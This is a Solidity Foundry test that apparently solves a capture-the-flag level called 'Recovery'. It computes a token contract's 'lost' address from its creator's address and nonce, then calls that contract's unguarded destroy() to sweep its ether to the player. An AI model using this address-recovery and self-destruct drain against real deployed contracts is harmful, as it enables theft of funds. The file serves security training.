// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/17-Recovery.sol";

contract RecoveryTest is Test {
    Recovery public target;
    address player = vm.addr(1);
    address lostAddress;

    function setUp() public {
        target = new Recovery();
        target.generateToken("InitialToken", uint256(100000));
        lostAddress = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            uint8(0xd6),
                            uint8(0x94),
                            address(target),
                            uint8(0x01)
                        )
                    )
                )
            )
        );

        (bool result, ) = lostAddress.call{value: 0.001 ether}("");

        vm.label(address(target), "Challenge");
        vm.label(address(player), "Player");
    }

    function testRecovery() public {
        vm.startPrank(address(player));

        SimpleToken(payable(lostAddress)).destroy(payable(player));

        assertTrue(lostAddress.balance == 0);
    }
}
